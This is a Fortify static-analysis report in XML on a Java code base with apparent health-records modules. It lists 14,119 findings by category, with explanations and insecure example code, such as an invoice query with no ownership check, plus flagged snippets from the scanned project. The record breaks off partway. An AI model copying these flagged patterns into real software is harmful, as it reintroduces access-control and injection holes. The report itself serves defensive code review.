<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ReportDefinition type="standard">
    <TemplateName>Fortify Developer Workbook</TemplateName>
    <TemplatePath></TemplatePath>
    <LogoPath>/MF_logo.jpg</LogoPath>
    <Footnote>Copyright 2018 Micro Focus or one of its affiliates.</Footnote>
    <UserName></UserName>
    <ReportSection enabled="true" optionalSubsections="false">
        <Title>Report Overview</Title>
        <SubSection enabled="true">
            <Title>Report Summary</Title>
            <Description>This provides a high level summary of the findings that the analysis produced.  Also includes basic information on the scope of the scan.</Description>
            <Text>On Sep 13, 2022, a source code review was performed over the UT_JAVA_Adhoc_Sep_13_2022_15_16 code base. 1,697 files, 182,494 LOC (Executable) were scanned. A total of 14119 issues were uncovered during the analysis.  This report provides a comprehensive description of all the types of issues found in this project.  Specific examples and source code are provided for each issue type.</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Issue Summary by Fortify Priority Order</Title>
            <Description>A table summarizing the number of issues found and the breakdown of issues in each Fortify Priority Level</Description>
            <IssueListing listing="false" limit="-1">
                <Refinement></Refinement>
                <Chart chartType="table">
                    <Axis>Fortify Priority Order</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="10154">
                        <groupTitle>Low</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3500">
                        <groupTitle>High</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="354">
                        <groupTitle>Medium</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="111">
                        <groupTitle>Critical</groupTitle>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
    <ReportSection enabled="true" optionalSubsections="false">
        <Title>Issue Summary</Title>
        <SubSection enabled="true">
            <Title>Overall number of results</Title>
            <Description>Results count</Description>
            <Text>The scan found 14119 issues.</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Issues By Category</Title>
            <IssueListing listing="false" limit="-1">
                <Refinement></Refinement>
                <Chart chartType="table">
                    <Axis>Category</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="3238">
                        <groupTitle>Trust Boundary Violation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2241">
                        <groupTitle>Access Control: Database</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1503">
                        <groupTitle>System Information Leak: HTML Comment in JSP</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="796">
                        <groupTitle>Denial of Service: Parse Double</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="718">
                        <groupTitle>System Information Leak: Internal</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="561">
                        <groupTitle>Cross-Site Scripting: Reflected</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="542">
                        <groupTitle>System Information Leak</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="500">
                        <groupTitle>Cross-Site Scripting: Poor Validation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="410">
                        <groupTitle>SQL Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="385">
                        <groupTitle>Missing Check against Null</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="380">
                        <groupTitle>Poor Error Handling: Overly Broad Throws</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="315">
                        <groupTitle>SQL Injection: Persistence</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="281">
                        <groupTitle>Poor Error Handling: Overly Broad Catch</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="269">
                        <groupTitle>Poor Style: Value Never Read</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="229">
                        <groupTitle>Access Control: LDAP</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="197">
                        <groupTitle>Poor Logging Practice: Use of a System Output Stream</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="136">
                        <groupTitle>LDAP Manipulation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="119">
                        <groupTitle>Code Correctness: Erroneous String Compare</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="114">
                        <groupTitle>Cross-Site Scripting: Persistent</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="97">
                        <groupTitle>Path Manipulation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="94">
                        <groupTitle>Denial of Service: StringBuilder</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="81">
                        <groupTitle>Redundant Null Check</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="62">
                        <groupTitle>Poor Style: Non-final Public Static Field</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="61">
                        <groupTitle>Race Condition: Singleton Member Field</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="54">
                        <groupTitle>Poor Error Handling: Empty Catch Block</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="50">
                        <groupTitle>Null Dereference</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="50">
                        <groupTitle>Password Management: Password in Comment</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="39">
                        <groupTitle>Password Management: Hardcoded Password</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="37">
                        <groupTitle>LDAP Entry Poisoning</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="33">
                        <groupTitle>LDAP Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="32">
                        <groupTitle>Dead Code: Expression is Always true</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="31">
                        <groupTitle>Dead Code: Unused Method</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="27">
                        <groupTitle>Unreleased Resource: Database</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="27">
                        <groupTitle>Unreleased Resource: Streams</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="26">
                        <groupTitle>XML External Entity Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="24">
                        <groupTitle>JavaScript Hijacking: Vulnerable Framework</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="23">
                        <groupTitle>XML Entity Expansion Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="22">
                        <groupTitle>J2EE Bad Practices: Leftover Debug Code</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Password Management: Password in Configuration File</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Code Correctness: Constructor Invokes Overridable Function</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Dynamic Code Evaluation: JNDI Reference Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Poor Error Handling: Throw Inside Finally</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="17">
                        <groupTitle>System Information Leak: External</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="16">
                        <groupTitle>Code Correctness: Double-Checked Locking</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Header Manipulation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Unchecked Return Value</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="12">
                        <groupTitle>Code Correctness: String Comparison of Float</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="12">
                        <groupTitle>Dead Code: Expression is Always false</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="11">
                        <groupTitle>J2EE Bad Practices: Non-Serializable Object Stored in Session</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="10">
                        <groupTitle>Portability Flaw: Locale Dependent Comparison</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="10">
                        <groupTitle>System Information Leak: Incomplete Servlet Error Handling</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>Cross-Site Request Forgery</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>Denial of Service</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Dead Code: Unused Field</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Race Condition: Format Flaw</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Header Manipulation: SMTP</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>J2EE Bad Practices: Threads</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Poor Style: Confusing Naming</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Unsafe Reflection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Weak XML Schema: Unbounded Occurrences</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Missing XML Validation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Privacy Violation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Code Correctness: Class Does Not Implement equals</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Dead Code: Empty Try Block</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Insecure Randomness</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Insecure SSL: Server Identity Verification Disabled</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Insecure Transport: Mail Transmission</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Misconfiguration: Missing Error Handling</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Code Correctness: Multiple Stream Commits</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Dynamic Code Evaluation: Unsafe Deserialization</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Hidden Field</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>J2EE Bad Practices: JVM Termination</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Key Management: Hardcoded Encryption Key</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Access Specifier Manipulation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Misconfiguration: Insecure Message Security</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Misconfiguration: Insecure Transport Receiver</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Misconfiguration: Insecure Transport Sender</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Service Provider Misconfiguration: Inbound WS-Security Not Enabled</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Service Provider Misconfiguration: Outbound WS-Security Not Enabled</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Service Provider Misconfiguration: WS-Security Not Enabled</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Service Requester Misconfiguration: WS-Security Not Enabled</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Code Correctness: Byte Array to String Conversion</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Code Correctness: Class Does Not Implement Cloneable</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Code Correctness: null Argument to equals()</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Cookie Security: Cookie not Sent Over SSL</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Cookie Security: HTTPOnly not Set</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Cookie Security: Persistent Cookie</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>EJB Bad Practices: Use of AWT/Swing</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Excessive Session Timeout</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Missing Servlet Mapping</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Object Model Violation: Erroneous clone() Method</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Often Misused: File Upload</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Poor Logging Practice: Logger Not Declared Static Final</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Portability Flaw: File Separator</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>System Information Leak: Apache Axis 2</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Unreleased Resource: Files</groupTitle>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
    <ReportSection enabled="true" optionalSubsections="true">
        <Title>Results Outline</Title>
        <SubSection enabled="true">
            <Title>Vulnerability Examples by Category</Title>
            <Description>Results summary of all issue categories.  Vulnerability examples are provided by category.</Description>
            <IssueListing listing="true" limit="5">
                <Refinement></Refinement>
                <Chart chartType="list">
                    <Axis>Category</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="3238">
                        <groupTitle>Trust Boundary Violation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method setDisplayMsg() in SecurityUtil.java commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary--to move from untrusted to trusted.

A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. The most common way to make this mistake is to allow trusted and untrusted data to commingle in the same data structure.



Example: The following Java code accepts an HTTP request and stores the usrname parameter in the HTTP session object before checking to ensure that the user has been authenticated.


usrname = request.getParameter("usrname");
if (session.getAttribute(ATTR_USR) != null) {
    session.setAttribute(ATTR_USR, usrname);
}


Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion eventually allows some data to be used without first being validated.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Define clear trust boundaries in the application. Do not use the same data structure to hold trusted data in some contexts and untrusted data in other contexts. Minimize the number of ways that data can move across a trust boundary.

Trust boundary violations sometimes occur when input needs to be built up over a series of user interactions before being processed. It may not be possible to do complete input validation until all of the data has arrived. In these situations, it is still important to maintain a trust boundary. The untrusted data should be built up in a single untrusted data structure, validated, and then moved into a trusted location.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Do not feel that you need to find a "smoking gun" situation in which data that has not been validated is assumed to be trusted. If trust boundaries are not clearly delineated and respected, validation errors are inevitable. Instead of spending time searching for an exploitable scenario, concentrate on teaching programmers to create good trust boundaries.

2. Most programs have trust boundaries that are defined by the semantics of the application. Consider writing custom rules to check for other places where user input crosses a trust boundary.

3. A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3238</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="79D46549F7258F4FE0E7545EB991C9B4" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The method setDisplayMsg() in SecurityUtil.java commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>411</LineStart>
<Snippet>        else
            b_objDispMsgBean.addMsgDetail(p_sMsgCode, p_arMsgParams);
        p_objRequest.setAttribute(CommonConstants.ATTR_APP_MSG_BEAN, b_objDispMsgBean);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>249</LineStart>
<Snippet>        try
        {
            l_sGridName = p_reqRequest.getParameter(GRID_NAME);
            l_enmParameterNames = p_reqRequest.getParameterNames();
            boolean isFld=false;</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="50260DAAC3FA7AB42D9C4BD5C6376DF1" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The method setDisplayMsg() in SecurityUtil.java commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>411</LineStart>
<Snippet>        else
            b_objDispMsgBean.addMsgDetail(p_sMsgCode, p_arMsgParams);
        p_objRequest.setAttribute(CommonConstants.ATTR_APP_MSG_BEAN, b_objDispMsgBean);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EHRRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/EHRRequestHandler.java</FilePath>
<LineStart>50</LineStart>
<Snippet>    	
    	try {
    		String m_sUserLoginID = p_objRequest.getParameter("fhdn&amp;UserId");
    		String m_sUserDomainID = p_objRequest.getParameter("fhdn&amp;DomainName");
    		String m_sUserProfileId = p_objRequest.getParameter("fhdn&amp;ProfileId");</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F46B5FD40B85B0413BA1C1166FDB1509" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The method setDisplayMsg() in SecurityUtil.java commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>411</LineStart>
<Snippet>        else
            b_objDispMsgBean.addMsgDetail(p_sMsgCode, p_arMsgParams);
        p_objRequest.setAttribute(CommonConstants.ATTR_APP_MSG_BEAN, b_objDispMsgBean);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SSOLoginRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/SSOLoginRequestHandler.java</FilePath>
<LineStart>324</LineStart>
<Snippet>		String l_sFnName = "readSSOUserDetails";

		l_sTemp = p_objRequest.getHeader(ECAMSSecurityConstants.PARAM_SSO_ID);

		if (m_objLogger.isDebugEnabled())</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E234DB532381992F95E4EC184E4CC1A9" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The method setDisplayMsg() in SecurityUtil.java commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>411</LineStart>
<Snippet>        else
            b_objDispMsgBean.addMsgDetail(p_sMsgCode, p_arMsgParams);
        p_objRequest.setAttribute(CommonConstants.ATTR_APP_MSG_BEAN, b_objDispMsgBean);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>MultipartRequest.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/multipartrequest/MultipartRequest.java</FilePath>
<LineStart>146</LineStart>
<Snippet>    	//get a list of all the items which contains the form fields and 
    	//file details
    	List l_alFileItems = l_objUploadObject.parseRequest(p_objRequest);
    	//and the list
		Iterator l_itMultipartFormIterator = l_alFileItems.iterator();</Snippet>
<TargetFunction>org.apache.commons.fileupload.servlet.ServletFileUpload.parseRequest()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="41630AE4E5561C4D6A40215D4B0B203F" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The method setDisplayMsg() in SecurityUtil.java commingles trusted and untrusted data in the same data structure, which encourages programmers to mistakenly trust unvalidated data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>411</LineStart>
<Snippet>        else
            b_objDispMsgBean.addMsgDetail(p_sMsgCode, p_arMsgParams);
        p_objRequest.setAttribute(CommonConstants.ATTR_APP_MSG_BEAN, b_objDispMsgBean);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>588</LineStart>
<Snippet>                                    l_sOperator = l_sBase + WILDCARD_OPERATOR + l_sGridName + CommonConstants.PIPE;
                                    l_sOperator += l_sFParameterName;
                                    l_sOperatorValue = (String) p_reqRequest.getParameter(l_sOperator);
                                    if((l_sOperatorValue == null) ||
                                                (l_sOperatorValue.equals(CommonConstants.EMPTY_STRING)))</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2241">
                        <groupTitle>Access Control: Database</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Without proper access control, the method preparedStmtInsert() in DbUtilImpl.java can execute a SQL statement on line 5787 that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Database access control errors occur when:

1.	Data enters a program from an untrusted source.


2.	The data is used to specify the value of a primary key in a SQL query.



Example 1: The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user.


...
id = Integer.decode(request.getParameter("invoiceID"));
String query = "SELECT * FROM invoices WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setInt(1, id);
ResultSet results = stmt.execute();
...



The problem is that the developer has failed to consider all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker might bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.

Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.


Example 2: The following code adapts Example 1 to the Android platform.


...
        String id = this.getIntent().getExtras().getString("invoiceID");
        String query = "SELECT * FROM invoices WHERE id = ?";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, new Object[]{id});
...


A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Rather than relying on the presentation layer to restrict values submitted by the user, access control should be handled by the application and database layers. Under no circumstances should a user be allowed to retrieve or modify a row in the database without the appropriate permissions. Every query that accesses the database should enforce this policy, which can often be accomplished by simply including the current authenticated username as part of the query.


Example 3: The following code implements the same functionality as Example 1 but imposes an additional constraint to verify that the invoice belongs to the currently authenticated user.


...
userName = ctx.getAuthenticatedUserName();
id = Integer.decode(request.getParameter("invoiceID"));
String query =
        "SELECT * FROM invoices WHERE id = ? AND user = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setInt(1, id);
stmt.setString(2, userName);
ResultSet results = stmt.execute();
...



And here is an Android equivalent:


...
        PasswordAuthentication pa = authenticator.getPasswordAuthentication();
        String userName = pa.getUserName();
        String id = this.getIntent().getExtras().getString("invoiceID");
        String query = "SELECT * FROM invoices WHERE id = ? AND user = ?";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, new Object[]{id, userName});
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2241</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="74861D2EA6509998A89F5FA836175E33" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method preparedStmtInsert() in DbUtilImpl.java can execute a SQL statement on line 5787 that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5787</LineStart>
<Snippet>                    {
                        l_mapDataHash.put("ADDED_RECORD_PRIMARY_KEY", sequnceNumber);
                        l_psPreparedStatement.setString(b_iToken, sequnceNumber);
                        continue;
                    }</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5110</LineStart>
<Snippet>                    ResultSet.CONCUR_READ_ONLY);

            l_rsResultSet = l_stQueryStatement.executeQuery(p_sQuery);

            Date l_objQueryEndDate = null;</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="678772D249AAAEDFDDB9A3FC4E447814" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method setNumberAtPosition() in DbUtilImpl.java can execute a SQL statement on line 6875 that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>6875</LineStart>
<Snippet>        {
            l_psPreparedStatement.setDouble(b_iToken,
                    Double.parseDouble((String) l_sColValue));
        }
    }</Snippet>
<TargetFunction>java.sql.PreparedStatement.setDouble()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
